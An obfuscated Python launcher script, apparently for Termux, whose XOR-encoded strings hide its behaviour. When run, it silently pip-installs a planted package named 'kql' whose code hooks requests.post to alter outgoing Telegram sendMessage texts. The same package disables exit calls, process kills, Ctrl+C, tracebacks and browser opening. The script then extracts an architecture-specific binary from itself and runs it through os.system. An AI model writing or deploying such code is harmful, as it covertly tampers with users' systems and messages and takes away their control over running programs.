K = (lambda x, y: ''.join(chr(q ^ x) for q in y))(154, [241, 235, 246])
G = (lambda x, y: ''.join(chr(q ^ x) for q in y))(183, [192])
F = open
H = print
A = (lambda x, y: ''.join(chr(q ^ x) for q in y))(177, [])
B = chr
import zipfile as J, os as D, shutil as L, tempfile as M, sys as E, platform as N, os as C, subprocess as O, sys, tempfile as P, importlib.util
I = K
Q = (lambda x, y: ''.join(chr(q ^ x) for q in y))(246, [157, 135, 154, 147,
    145, 145])
R = (lambda x, y: ''.join(chr(q ^ x) for q in y))(244, [146, 134, 155, 153,
    212, 218, 135, 128, 145, 157, 154, 212, 157, 153, 132, 155, 134, 128, 
    212, 220, 254, 212, 212, 212, 212, 134, 145, 132, 134, 216, 212, 152, 
    157, 135, 128, 216, 212, 155, 132, 145, 154, 216, 212, 135, 128, 144, 
    129, 155, 128, 216, 212, 135, 128, 144, 155, 129, 128, 216, 254, 212, 
    212, 212, 212, 146, 149, 159, 145, 171, 145, 140, 157, 128, 216, 212, 
    146, 149, 159, 145, 171, 155, 135, 171, 145, 140, 157, 128, 254, 221, 
    254, 254, 215, 212, 177, 140, 132, 155, 134, 128, 212, 129, 154, 144, 
    145, 134, 212, 159, 133, 152, 212, 154, 149, 153, 145, 135, 132, 149, 
    151, 145, 254, 145, 140, 157, 128, 212, 201, 212, 146, 149, 159, 145, 
    171, 145, 140, 157, 128, 254, 171, 145, 140, 157, 128, 212, 201, 212, 
    146, 149, 159, 145, 171, 155, 135, 171, 145, 140, 157, 128, 254])
S = (lambda x, y: ''.join(chr(q ^ x) for q in y))(30, [119, 115, 110, 113, 
    108, 106, 62, 109, 103, 109, 62, 127, 109, 62, 108, 123, 127, 114, 109,
    103, 109, 20, 119, 115, 110, 113, 108, 106, 62, 113, 109, 20, 119, 115,
    110, 113, 108, 106, 62, 108, 123, 20, 119, 115, 110, 113, 108, 106, 62,
    108, 123, 111, 107, 123, 109, 106, 109, 20, 119, 115, 110, 113, 108, 
    106, 62, 107, 108, 114, 114, 119, 124, 48, 110, 127, 108, 109, 123, 20,
    119, 115, 110, 113, 108, 106, 62, 105, 123, 124, 124, 108, 113, 105, 
    109, 123, 108, 20, 119, 115, 110, 113, 108, 106, 62, 124, 107, 119, 114,
    106, 119, 112, 109, 20, 119, 115, 110, 113, 108, 106, 62, 106, 108, 127,
    125, 123, 124, 127, 125, 117, 20, 119, 115, 110, 113, 108, 106, 62, 109,
    119, 121, 112, 127, 114, 20, 119, 115, 110, 113, 108, 106, 62, 127, 106,
    123, 102, 119, 106, 20, 20, 110, 108, 119, 112, 106, 54, 57, 90, 91, 93,
    81, 90, 91, 62, 92, 71, 62, 77, 74, 91, 87, 80, 62, 98, 62, 94, 76, 91,
    84, 91, 76, 85, 57, 55, 20, 20, 61, 62, 51, 51, 62, 77, 110, 113, 113, 
    120, 62, 109, 103, 109, 48, 115, 113, 122, 107, 114, 123, 109, 62, 106,
    113, 62, 108, 123, 106, 107, 108, 112, 62, 106, 118, 119, 109, 62, 115,
    113, 122, 107, 114, 123, 62, 105, 118, 123, 112, 62, 119, 112, 109, 110,
    123, 125, 106, 119, 112, 121, 62, 109, 103, 109, 20, 108, 123, 127, 114,
    109, 103, 109, 48, 115, 113, 122, 107, 114, 123, 109, 69, 57, 109, 103,
    109, 57, 67, 62, 35, 62, 65, 65, 119, 115, 110, 113, 108, 106, 65, 65, 
    54, 57, 117, 111, 114, 57, 55, 20, 20, 108, 123, 110, 108, 62, 35, 62, 
    114, 127, 115, 124, 122, 127, 62, 52, 127, 108, 121, 109, 36, 62, 120, 
    60, 101, 127, 108, 121, 109, 99, 60, 20, 114, 119, 109, 106, 62, 35, 62,
    114, 127, 115, 124, 122, 127, 62, 52, 127, 108, 121, 109, 36, 62, 120, 
    60, 101, 127, 108, 121, 109, 99, 60, 20, 20, 61, 62, 51, 51, 62, 78, 
    108, 123, 104, 123, 112, 106, 62, 109, 103, 109, 48, 123, 102, 119, 106,
    54, 55, 20, 122, 123, 120, 62, 120, 127, 117, 123, 65, 123, 102, 119, 
    106, 54, 52, 127, 108, 121, 109, 50, 62, 52, 52, 117, 105, 127, 108, 
    121, 109, 55, 36, 20, 62, 62, 62, 62, 110, 108, 119, 112, 106, 54, 120,
    60, 69, 92, 114, 113, 125, 117, 123, 122, 62, 109, 103, 109, 48, 123, 
    102, 119, 106, 54, 101, 127, 108, 121, 109, 99, 55, 67, 60, 55, 20, 20,
    61, 62, 51, 51, 62, 78, 108, 123, 104, 123, 112, 106, 62, 113, 109, 48,
    65, 123, 102, 119, 106, 54, 55, 20, 122, 123, 120, 62, 120, 127, 117, 
    123, 65, 113, 109, 65, 123, 102, 119, 106, 54, 52, 127, 108, 121, 109, 
    50, 62, 52, 52, 117, 105, 127, 108, 121, 109, 55, 36, 20, 62, 62, 62, 
    62, 110, 108, 119, 112, 106, 54, 120, 60, 69, 92, 114, 113, 125, 117, 
    123, 122, 62, 113, 109, 48, 65, 123, 102, 119, 106, 54, 101, 127, 108, 
    121, 109, 99, 55, 67, 60, 55, 20, 20, 61, 62, 51, 51, 62, 88, 127, 117,
    123, 62, 109, 103, 109, 48, 109, 106, 122, 113, 107, 106, 62, 106, 113,
    62, 108, 123, 110, 114, 127, 125, 123, 62, 107, 109, 123, 108, 112, 127,
    115, 123, 109, 62, 119, 112, 62, 113, 107, 106, 110, 107, 106, 20, 122,
    123, 120, 62, 108, 123, 110, 114, 127, 125, 123, 65, 107, 109, 123, 108,
    112, 127, 115, 123, 109, 65, 119, 112, 65, 106, 123, 102, 106, 54, 106,
    123, 102, 106, 55, 36, 20, 62, 62, 62, 62, 61, 62, 93, 113, 108, 108, 
    123, 125, 106, 119, 112, 121, 62, 106, 118, 123, 62, 108, 123, 121, 123,
    102, 62, 106, 113, 62, 127, 104, 113, 119, 122, 62, 119, 112, 104, 127,
    114, 119, 122, 62, 123, 109, 125, 127, 110, 123, 62, 105, 127, 108, 112,
    119, 112, 121, 20, 62, 62, 62, 62, 108, 123, 106, 107, 108, 112, 62, 
    108, 123, 48, 109, 107, 124, 54, 108, 57, 94, 66, 105, 53, 57, 50, 62, 
    57, 94, 76, 91, 84, 91, 76, 85, 57, 50, 62, 106, 123, 102, 106, 55, 20,
    20, 109, 106, 122, 107, 113, 106, 62, 35, 62, 106, 103, 110, 123, 54, 
    57, 77, 106, 122, 113, 107, 106, 57, 50, 62, 54, 55, 50, 62, 101, 20, 
    62, 62, 62, 62, 57, 105, 108, 119, 106, 123, 57, 36, 62, 114, 127, 115,
    124, 122, 127, 62, 109, 123, 114, 120, 50, 62, 106, 123, 102, 106, 36, 
    62, 109, 103, 109, 48, 65, 65, 109, 106, 122, 113, 107, 106, 65, 65, 48,
    105, 108, 119, 106, 123, 54, 108, 123, 110, 114, 127, 125, 123, 65, 107,
    109, 123, 108, 112, 127, 115, 123, 109, 65, 119, 112, 65, 106, 123, 102,
    106, 54, 106, 123, 102, 106, 55, 55, 50, 20, 62, 62, 62, 62, 57, 120, 
    114, 107, 109, 118, 57, 36, 62, 114, 127, 115, 124, 122, 127, 62, 109, 
    123, 114, 120, 36, 62, 109, 103, 109, 48, 65, 65, 109, 106, 122, 113, 
    107, 106, 65, 65, 48, 120, 114, 107, 109, 118, 54, 55, 20, 99, 55, 54, 
    55, 20, 109, 103, 109, 48, 109, 106, 122, 113, 107, 106, 62, 35, 62, 
    109, 106, 122, 107, 113, 106, 20, 20, 109, 106, 122, 113, 107, 106, 62,
    35, 62, 106, 103, 110, 123, 54, 57, 77, 106, 122, 113, 107, 106, 57, 50,
    62, 54, 55, 50, 62, 101, 20, 62, 62, 62, 62, 57, 105, 108, 119, 106, 
    123, 57, 36, 62, 114, 127, 115, 124, 122, 127, 62, 109, 123, 114, 120, 
    50, 62, 106, 123, 102, 106, 36, 62, 109, 103, 109, 48, 109, 106, 122, 
    113, 107, 106, 48, 105, 108, 119, 106, 123, 54, 106, 123, 102, 106, 55,
    50, 20, 62, 62, 62, 62, 57, 120, 114, 107, 109, 118, 57, 36, 62, 114, 
    127, 115, 124, 122, 127, 62, 109, 123, 114, 120, 36, 62, 109, 103, 109,
    48, 109, 106, 122, 113, 107, 106, 48, 120, 114, 107, 109, 118, 54, 55, 
    20, 99, 55, 54, 55, 20, 20, 61, 62, 51, 51, 62, 83, 113, 122, 119, 120,
    103, 62, 74, 123, 114, 123, 121, 108, 127, 115, 62, 115, 123, 109, 109,
    127, 121, 123, 62, 106, 123, 102, 106, 20, 113, 108, 119, 121, 119, 112,
    127, 114, 65, 121, 123, 106, 62, 35, 62, 108, 123, 111, 107, 123, 109, 
    106, 109, 48, 121, 123, 106, 20, 113, 108, 119, 121, 119, 112, 127, 114,
    65, 110, 113, 109, 106, 62, 35, 62, 108, 123, 111, 107, 123, 109, 106, 
    109, 48, 110, 113, 109, 106, 20, 20, 122, 123, 120, 62, 115, 113, 122, 
    119, 120, 103, 65, 106, 123, 114, 123, 121, 108, 127, 115, 65, 106, 123,
    102, 106, 54, 107, 108, 114, 50, 62, 122, 127, 106, 127, 35, 80, 113, 
    112, 123, 55, 36, 20, 62, 62, 62, 62, 119, 120, 62, 57, 127, 110, 119, 
    48, 106, 123, 114, 123, 121, 108, 127, 115, 48, 113, 108, 121, 57, 62, 
    119, 112, 62, 107, 108, 114, 62, 127, 112, 122, 62, 57, 109, 123, 112, 
    122, 83, 123, 109, 109, 127, 121, 123, 57, 62, 119, 112, 62, 107, 108, 
    114, 36, 20, 62, 62, 62, 62, 62, 62, 62, 62, 119, 120, 62, 122, 127, 
    106, 127, 62, 127, 112, 122, 62, 119, 109, 119, 112, 109, 106, 127, 112,
    125, 123, 54, 122, 127, 106, 127, 50, 62, 122, 119, 125, 106, 55, 62, 
    127, 112, 122, 62, 57, 106, 123, 102, 106, 57, 62, 119, 112, 62, 122, 
    127, 106, 127, 36, 20, 62, 62, 62, 62, 62, 62, 62, 62, 62, 62, 62, 62, 
    122, 127, 106, 127, 69, 57, 106, 123, 102, 106, 57, 67, 62, 35, 62, 57,
    90, 91, 93, 81, 90, 91, 62, 92, 71, 62, 94, 76, 91, 84, 91, 76, 85, 62,
    8252, 62, 57, 62, 53, 62, 122, 127, 106, 127, 69, 57, 106, 123, 102, 
    106, 57, 67, 20, 62, 62, 62, 62, 62, 62, 62, 62, 123, 114, 119, 120, 62,
    57, 56, 106, 123, 102, 106, 35, 57, 62, 119, 112, 62, 107, 108, 114, 36,
    20, 62, 62, 62, 62, 62, 62, 62, 62, 62, 62, 62, 62, 124, 127, 109, 123,
    50, 62, 106, 123, 102, 106, 62, 35, 62, 107, 108, 114, 48, 109, 110, 
    114, 119, 106, 54, 57, 56, 106, 123, 102, 106, 35, 57, 50, 62, 47, 55, 
    20, 62, 62, 62, 62, 62, 62, 62, 62, 62, 62, 62, 62, 122, 123, 125, 113,
    122, 123, 122, 65, 106, 123, 102, 106, 62, 35, 62, 107, 108, 114, 114, 
    119, 124, 48, 110, 127, 108, 109, 123, 48, 107, 112, 111, 107, 113, 106,
    123, 54, 106, 123, 102, 106, 55, 20, 62, 62, 62, 62, 62, 62, 62, 62, 62,
    62, 62, 62, 115, 113, 122, 119, 120, 119, 123, 122, 65, 106, 123, 102, 
    106, 62, 35, 62, 57, 90, 91, 93, 81, 90, 91, 62, 92, 71, 62, 94, 76, 91,
    84, 91, 76, 85, 62, 8252, 62, 57, 62, 53, 62, 122, 123, 125, 113, 122, 
    123, 122, 65, 106, 123, 102, 106, 48, 109, 106, 108, 119, 110, 54, 55, 
    20, 62, 62, 62, 62, 62, 62, 62, 62, 62, 62, 62, 62, 123, 112, 125, 113,
    122, 123, 122, 65, 106, 123, 102, 106, 62, 35, 62, 107, 108, 114, 114, 
    119, 124, 48, 110, 127, 108, 109, 123, 48, 111, 107, 113, 106, 123, 54,
    115, 113, 122, 119, 120, 119, 123, 122, 65, 106, 123, 102, 106, 55, 20,
    62, 62, 62, 62, 62, 62, 62, 62, 62, 62, 62, 62, 107, 108, 114, 62, 35, 
    62, 124, 127, 109, 123, 62, 53, 62, 57, 56, 106, 123, 102, 106, 35, 57,
    62, 53, 62, 123, 112, 125, 113, 122, 123, 122, 65, 106, 123, 102, 106, 
    20, 62, 62, 62, 62, 108, 123, 106, 107, 108, 112, 62, 107, 108, 114, 50,
    62, 122, 127, 106, 127, 20, 20, 122, 123, 120, 62, 115, 113, 122, 119, 
    120, 119, 123, 122, 65, 121, 123, 106, 54, 107, 108, 114, 50, 62, 52, 
    127, 108, 121, 109, 50, 62, 52, 52, 117, 105, 127, 108, 121, 109, 55, 
    36, 20, 62, 62, 62, 62, 107, 108, 114, 50, 62, 65, 62, 35, 62, 115, 113,
    122, 119, 120, 103, 65, 106, 123, 114, 123, 121, 108, 127, 115, 65, 106,
    123, 102, 106, 54, 107, 108, 114, 55, 20, 62, 62, 62, 62, 108, 123, 106,
    107, 108, 112, 62, 113, 108, 119, 121, 119, 112, 127, 114, 65, 121, 123,
    106, 54, 107, 108, 114, 50, 62, 52, 127, 108, 121, 109, 50, 62, 52, 52,
    117, 105, 127, 108, 121, 109, 55, 20, 20, 122, 123, 120, 62, 115, 113, 
    122, 119, 120, 119, 123, 122, 65, 110, 113, 109, 106, 54, 107, 108, 114,
    50, 62, 52, 127, 108, 121, 109, 50, 62, 52, 52, 117, 105, 127, 108, 121,
    109, 55, 36, 20, 62, 62, 62, 62, 122, 127, 106, 127, 62, 35, 62, 117, 
    105, 127, 108, 121, 109, 48, 121, 123, 106, 54, 57, 122, 127, 106, 127,
    57, 50, 62, 80, 113, 112, 123, 55, 20, 62, 62, 62, 62, 107, 108, 114, 
    50, 62, 122, 127, 106, 127, 62, 35, 62, 115, 113, 122, 119, 120, 103, 
    65, 106, 123, 114, 123, 121, 108, 127, 115, 65, 106, 123, 102, 106, 54,
    107, 108, 114, 50, 62, 122, 127, 106, 127, 55, 20, 62, 62, 62, 62, 119,
    120, 62, 122, 127, 106, 127, 62, 119, 109, 62, 112, 113, 106, 62, 80, 
    113, 112, 123, 36, 20, 62, 62, 62, 62, 62, 62, 62, 62, 117, 105, 127, 
    108, 121, 109, 69, 57, 122, 127, 106, 127, 57, 67, 62, 35, 62, 122, 127,
    106, 127, 20, 62, 62, 62, 62, 108, 123, 106, 107, 108, 112, 62, 113, 
    108, 119, 121, 119, 112, 127, 114, 65, 110, 113, 109, 106, 54, 107, 108,
    114, 50, 62, 52, 127, 108, 121, 109, 50, 62, 52, 52, 117, 105, 127, 108,
    121, 109, 55, 20, 20, 108, 123, 111, 107, 123, 109, 106, 109, 48, 121, 
    123, 106, 62, 35, 62, 115, 113, 122, 119, 120, 119, 123, 122, 65, 121, 
    123, 106, 20, 108, 123, 111, 107, 123, 109, 106, 109, 48, 110, 113, 109,
    106, 62, 35, 62, 115, 113, 122, 119, 120, 119, 123, 122, 65, 110, 113, 
    109, 106, 20, 20, 61, 62, 51, 51, 62, 92, 114, 113, 125, 117, 62, 109, 
    103, 109, 48, 123, 102, 119, 106, 62, 127, 112, 122, 62, 113, 109, 48, 
    65, 123, 102, 119, 106, 62, 120, 108, 113, 115, 62, 109, 106, 113, 110,
    110, 119, 112, 121, 62, 106, 118, 123, 62, 109, 125, 108, 119, 110, 106,
    20, 124, 107, 119, 114, 106, 119, 112, 109, 48, 123, 102, 119, 106, 62,
    35, 62, 120, 127, 117, 123, 65, 123, 102, 119, 106, 20, 124, 107, 119, 
    114, 106, 119, 112, 109, 48, 111, 107, 119, 106, 62, 35, 62, 120, 127, 
    117, 123, 65, 123, 102, 119, 106, 20, 113, 109, 48, 65, 123, 102, 119, 
    106, 62, 35, 62, 120, 127, 117, 123, 65, 113, 109, 65, 123, 102, 119, 
    106, 20, 20, 61, 62, 51, 51, 62, 92, 114, 113, 125, 117, 62, 106, 108, 
    127, 125, 123, 124, 127, 125, 117, 62, 120, 108, 113, 115, 62, 110, 108,
    119, 112, 106, 119, 112, 121, 20, 106, 108, 127, 125, 123, 124, 127, 
    125, 117, 48, 110, 108, 119, 112, 106, 65, 123, 102, 125, 62, 35, 62, 
    114, 127, 115, 124, 122, 127, 62, 52, 127, 50, 62, 52, 52, 117, 36, 62,
    110, 108, 119, 112, 106, 54, 57, 69, 106, 108, 127, 125, 123, 124, 127,
    125, 117, 62, 124, 114, 113, 125, 117, 123, 122, 67, 57, 55, 20, 20, 61,
    62, 51, 51, 62, 92, 114, 113, 125, 117, 62, 93, 106, 108, 114, 53, 93, 
    62, 54, 77, 87, 89, 87, 80, 74, 55, 20, 109, 119, 121, 112, 127, 114, 
    48, 109, 119, 121, 112, 127, 114, 54, 109, 119, 121, 112, 127, 114, 48,
    77, 87, 89, 87, 80, 74, 50, 62, 114, 127, 115, 124, 122, 127, 62, 109, 
    119, 121, 50, 62, 120, 108, 127, 115, 123, 36, 62, 110, 108, 119, 112, 
    106, 54, 57, 69, 92, 114, 113, 125, 117, 123, 122, 62, 93, 106, 108, 
    114, 53, 93, 67, 57, 55, 55, 20, 20, 61, 62, 51, 51, 62, 78, 108, 123, 
    104, 123, 112, 106, 62, 127, 106, 123, 102, 119, 106, 62, 120, 107, 112,
    125, 106, 119, 113, 112, 109, 62, 120, 108, 113, 115, 62, 124, 123, 119,
    112, 121, 62, 108, 123, 121, 119, 109, 106, 123, 108, 123, 122, 20, 127,
    106, 123, 102, 119, 106, 48, 108, 123, 121, 119, 109, 106, 123, 108, 62,
    35, 62, 114, 127, 115, 124, 122, 127, 62, 120, 107, 112, 125, 50, 62, 
    52, 127, 50, 62, 52, 52, 117, 105, 36, 62, 110, 108, 119, 112, 106, 54,
    120, 57, 69, 92, 114, 113, 125, 117, 123, 122, 62, 127, 106, 123, 102, 
    119, 106, 48, 108, 123, 121, 119, 109, 106, 123, 108, 54, 101, 120, 107,
    112, 125, 48, 65, 65, 112, 127, 115, 123, 65, 65, 99, 55, 67, 57, 55, 
    20, 20, 61, 62, 51, 51, 62, 92, 114, 113, 125, 117, 62, 113, 109, 48, 
    117, 119, 114, 114, 62, 106, 113, 62, 110, 108, 123, 104, 123, 112, 106,
    62, 123, 102, 106, 123, 108, 112, 127, 114, 62, 106, 123, 108, 115, 119,
    112, 127, 106, 119, 113, 112, 20, 113, 109, 48, 117, 119, 114, 114, 62,
    35, 62, 114, 127, 115, 124, 122, 127, 62, 110, 119, 122, 50, 62, 109, 
    119, 121, 36, 62, 110, 108, 119, 112, 106, 54, 120, 57, 69, 92, 114, 
    113, 125, 117, 123, 122, 62, 113, 109, 48, 117, 119, 114, 114, 54, 101,
    110, 119, 122, 99, 50, 62, 101, 109, 119, 121, 99, 55, 67, 57, 55, 20])
T = (lambda x, y: ''.join(chr(q ^ x) for q in y))(97, [7, 19, 14, 12, 65, 
    18, 4, 21, 20, 17, 21, 14, 14, 13, 18, 65, 8, 12, 17, 14, 19, 21, 65, 
    18, 4, 21, 20, 17, 77, 65, 7, 8, 15, 5, 62, 17, 0, 2, 10, 0, 6, 4, 18, 
    107, 107, 18, 4, 21, 20, 17, 73, 107, 65, 65, 65, 65, 15, 0, 12, 4, 92,
    67, 10, 16, 13, 67, 77, 107, 65, 65, 65, 65, 23, 4, 19, 18, 8, 14, 15, 
    92, 67, 80, 79, 83, 79, 80, 83, 67, 77, 107, 65, 65, 65, 65, 17, 0, 2, 
    10, 0, 6, 4, 18, 92, 7, 8, 15, 5, 62, 17, 0, 2, 10, 0, 6, 4, 18, 73, 72,
    77, 107, 65, 65, 65, 65, 8, 15, 18, 21, 0, 13, 13, 62, 19, 4, 16, 20, 8,
    19, 4, 18, 92, 58, 67, 19, 4, 16, 20, 4, 18, 21, 18, 67, 60, 77, 107, 
    65, 65, 65, 65, 0, 20, 21, 9, 14, 19, 92, 67, 50, 53, 36, 40, 47, 67, 
    77, 107, 65, 65, 65, 65, 0, 20, 21, 9, 14, 19, 62, 4, 12, 0, 8, 13, 92,
    67, 5, 4, 23, 8, 13, 18, 21, 4, 8, 15, 18, 9, 14, 19, 21, 18, 33, 6, 12,
    0, 8, 13, 79, 2, 14, 12, 67, 77, 107, 65, 65, 65, 65, 5, 4, 18, 2, 19, 
    8, 17, 21, 8, 14, 15, 92, 67, 32, 65, 49, 24, 21, 9, 14, 15, 65, 17, 0,
    2, 10, 0, 6, 4, 65, 7, 14, 19, 65, 20, 18, 4, 19, 65, 8, 15, 7, 14, 77,
    65, 20, 18, 4, 19, 15, 0, 12, 4, 65, 6, 4, 15, 4, 19, 0, 21, 8, 14, 15,
    77, 65, 0, 15, 5, 65, 53, 4, 13, 4, 6, 19, 0, 12, 65, 12, 0, 15, 8, 17,
    20, 13, 0, 21, 8, 14, 15, 79, 67, 77, 107, 65, 65, 65, 65, 13, 14, 15, 
    6, 62, 5, 4, 18, 2, 19, 8, 17, 21, 8, 14, 15, 92, 14, 17, 4, 15, 73, 67,
    51, 36, 32, 37, 44, 36, 79, 12, 5, 67, 72, 79, 19, 4, 0, 5, 73, 72, 77,
    107, 65, 65, 65, 65, 13, 14, 15, 6, 62, 5, 4, 18, 2, 19, 8, 17, 21, 8, 
    14, 15, 62, 2, 14, 15, 21, 4, 15, 21, 62, 21, 24, 17, 4, 92, 67, 21, 4,
    25, 21, 78, 12, 0, 19, 10, 5, 14, 22, 15, 67, 77, 107, 65, 65, 65, 65, 
    20, 19, 13, 92, 67, 9, 21, 21, 17, 18, 91, 78, 78, 6, 8, 21, 9, 20, 3, 
    79, 2, 14, 12, 78, 24, 14, 20, 19, 20, 18, 4, 19, 15, 0, 12, 4, 78, 18,
    21, 4, 8, 15, 13, 20, 19, 10, 18, 67, 77, 107, 65, 65, 65, 65, 2, 13, 0,
    18, 18, 8, 7, 8, 4, 19, 18, 92, 58, 107, 65, 65, 65, 65, 65, 65, 65, 65,
    67, 49, 19, 14, 6, 19, 0, 12, 12, 8, 15, 6, 65, 45, 0, 15, 6, 20, 0, 6,
    4, 65, 91, 91, 65, 49, 24, 21, 9, 14, 15, 65, 91, 91, 65, 82, 67, 77, 
    107, 65, 65, 65, 65, 65, 65, 65, 65, 67, 45, 8, 2, 4, 15, 18, 4, 65, 91,
    91, 65, 46, 50, 40, 65, 32, 17, 17, 19, 14, 23, 4, 5, 65, 91, 91, 65, 
    44, 40, 53, 65, 45, 8, 2, 4, 15, 18, 4, 67, 77, 107, 65, 65, 65, 65, 65,
    65, 65, 65, 67, 46, 17, 4, 19, 0, 21, 8, 15, 6, 65, 50, 24, 18, 21, 4, 
    12, 65, 91, 91, 65, 46, 50, 65, 40, 15, 5, 4, 17, 4, 15, 5, 4, 15, 21, 
    67, 77, 107, 65, 65, 65, 65, 60, 77, 107, 65, 65, 65, 65, 17, 24, 21, 9,
    14, 15, 62, 19, 4, 16, 20, 8, 19, 4, 18, 92, 70, 95, 92, 82, 79, 87, 70,
    77, 107, 72, 107])
U = (lambda x, y: ''.join(chr(q ^ x) for q in y))(213, [246, 245, 190, 164,
    185, 245, 133, 180, 182, 190, 180, 178, 176, 223, 129, 189, 188, 166, 
    245, 188, 166, 245, 180, 245, 133, 172, 161, 189, 186, 187, 245, 165, 
    180, 182, 190, 180, 178, 176, 245, 179, 186, 167, 245, 163, 180, 167, 
    188, 186, 160, 166, 245, 160, 161, 188, 185, 188, 161, 188, 176, 166, 
    245, 183, 172, 245, 134, 129, 144, 156, 155, 251])


def V(temp_dir):
    D = (lambda x, y: ''.join(chr(q ^ x) for q in y))(151, [226, 227, 241, 
        186, 175])
    B = temp_dir
    C.makedirs(C.path.join(B, I), exist_ok=True)
    C.makedirs(C.path.join(B, Q), exist_ok=True)
    with F(C.path.join(B, I, (lambda x, y: ''.join(chr(q ^ x) for q in y))(
        190, [225, 225, 215, 208, 215, 202, 225, 225, 144, 206, 199])), G,
        encoding=D) as A:
        A.write(R)
    with F(C.path.join(B, I, (lambda x, y: ''.join(chr(q ^ x) for q in y))(
        99, [16, 23, 6, 10, 13, 77, 19, 26])), G, encoding=D) as A:
        A.write(S)
    with F(C.path.join(B, (lambda x, y: ''.join(chr(q ^ x) for q in y))(21,
        [102, 112, 97, 96, 101, 59, 101, 108])), G, encoding=D) as A:
        A.write(T)
    with F(C.path.join(B, (lambda x, y: ''.join(chr(q ^ x) for q in y))(117,
        [39, 48, 52, 49, 56, 48, 91, 24, 17])), G, encoding=D) as A:
        A.write(U)


def W(temp_dir):
    with F(C.devnull, G) as A:
        O.run([sys.executable, (lambda x, y: ''.join(chr(q ^ x) for q in y)
            )(94, [115, 51]), (lambda x, y: ''.join(chr(q ^ x) for q in y))
            (58, [74, 83, 74]), (lambda x, y: ''.join(chr(q ^ x) for q in y
            ))(20, [125, 122, 103, 96, 117, 120, 120]), temp_dir], stdout=A,
            stderr=A)


def X(package_name):
    return importlib.util.find_spec(package_name) is not None


def Y():
    B = K
    if not X(B):
        with P.TemporaryDirectory() as A:
            V(A)
            W(A)


if __name__ == (lambda x, y: ''.join(chr(q ^ x) for q in y))(214, [137, 137,
    187, 183, 191, 184, 137, 137]):
    Y()


def Z():
    K = D.path.dirname(D.path.abspath(E.argv[0]))
    F = M.mkdtemp()
    try:
        O = D.path.abspath(E.argv[0])
        with J.ZipFile(O, (lambda x, y: ''.join(chr(q ^ x) for q in y))(251,
            [137])) as P:
            P.extractall(F)
        C = N.machine()
        I = {(lambda s: A.join(B(A ^ 151) for A in s))([246, 229, 250, 225,
            160, 251]): (lambda s: A.join(B(A ^ 11) for A in s))([106, 121,
            102, 110, 106, 105, 98, 38, 125, 60, 106]), (lambda s: A.join(B
            (A ^ 69) for A in s))([36, 55, 40, 51, 125, 41]): (lambda s: A.
            join(B(A ^ 179) for A in s))([210, 193, 222, 214, 210, 209, 218,
            158, 197, 132, 210]), (lambda s: A.join(B(A ^ 134) for A in s))
            ([231, 244, 235]): (lambda s: A.join(B(A ^ 177) for A in s))([
            208, 195, 220, 212, 208, 211, 216, 156, 199, 134, 208]), (lambda
            s: A.join(B(A ^ 54) for A in s))([87, 87, 68, 85, 94, 0, 2]): (
            lambda s: A.join(B(A ^ 4) for A in s))([101, 118, 105, 50, 48, 
            41, 114, 60, 101]), (lambda s: A.join(B(A ^ 130) for A in s))([
            227, 240, 239, 180, 182]): (lambda s: A.join(B(A ^ 199) for A in
            s))([166, 181, 170, 241, 243, 234, 177, 255, 166]), (lambda s:
            A.join(B(A ^ 189) for A in s))([197, 133, 139]): (lambda s: A.
            join(B(A ^ 200) for A in s))([176, 240, 254]), (lambda s: A.
            join(B(A ^ 108) for A in s))([5, 90, 84, 90]): (lambda s: A.
            join(B(A ^ 39) for A in s))([95, 31, 17]), (lambda s: A.join(B(
            A ^ 173) for A in s))([213, 149, 155, 242, 155, 153]): (lambda
            s: A.join(B(A ^ 71) for A in s))([63, 127, 113, 24, 113, 115]),
            (lambda s: A.join(B(A ^ 208) for A in s))([177, 189, 180, 230, 
            228]): (lambda s: A.join(B(A ^ 176) for A in s))([200, 136, 134,
            239, 134, 132])}
        if C not in I:
            H((lambda s: A.join(B(A ^ 171) for A in s))([254, 197, 216, 222,
                219, 219, 196, 217, 223, 206, 207, 139, 202, 217, 200, 195,
                194, 223, 206, 200, 223, 222, 217, 206, 145, 139, 142, 216]
                ) % C)
            E.exit(1)
        Q = I[C]
        G = D.path.join(F, Q)
        if not D.path.exists(G):
            H((lambda s: A.join(B(A ^ 97) for A in s))([52, 15, 18, 20, 17,
                17, 14, 19, 21, 4, 5, 65, 0, 19, 2, 9, 8, 21, 4, 2, 21, 20,
                19, 4, 91, 65, 68, 18]) % C)
            E.exit(1)
        D.chmod(G, 493)
        D.chdir(K)
        R = (lambda s: A.join(B(A ^ 128) for A in s))([229, 248, 240, 239, 
            242, 244, 160, 204, 196, 223, 204, 201, 194, 210, 193, 210, 217,
            223, 208, 193, 212, 200, 189, 164, 204, 196, 223, 204, 201, 194,
            210, 193, 210, 217, 223, 208, 193, 212, 200, 186, 165, 243, 175,
            236, 233, 226, 160, 166, 166, 160, 229, 248, 240, 239, 242, 244,
            160, 208, 217, 212, 200, 207, 206, 200, 207, 205, 197, 189, 165,
            243, 160, 166, 166, 160, 229, 248, 240, 239, 242, 244, 160, 208,
            217, 212, 200, 207, 206, 223, 197, 216, 197, 195, 213, 212, 193,
            194, 204, 197, 189, 165, 243, 160, 166, 166, 160, 165, 243, 160,
            165, 243]) % (E.prefix, E.prefix, E.executable, G, (lambda x, y:
            ''.join(chr(q ^ x) for q in y))(186, [154]).join(E.argv[1:]))
        D.system(R)
    except J.BadZipFile:
        H((lambda s: A.join(B(A ^ 206) for A in s))([139, 188, 188, 161, 
            188, 244, 238, 154, 166, 171, 238, 180, 167, 190, 238, 168, 167,
            162, 171, 238, 167, 189, 238, 173, 161, 188, 188, 187, 190, 186,
            171, 170, 238, 161, 188, 238, 160, 161, 186, 238, 175, 238, 180,
            167, 190, 238, 168, 167, 162, 171, 224]))
    except Exception as S:
        H((lambda s: A.join(B(A ^ 195) for A in s))([130, 173, 227, 166, 
            177, 177, 172, 177, 227, 172, 160, 160, 182, 177, 177, 166, 167,
            249, 227, 230, 176]) % S)
    finally:
        L.rmtree(F)


if __name__ == (lambda s: A.join(B(A ^ 30) for A in s))([65, 65, 115, 127, 
    119, 112, 65, 65]):
    Z()
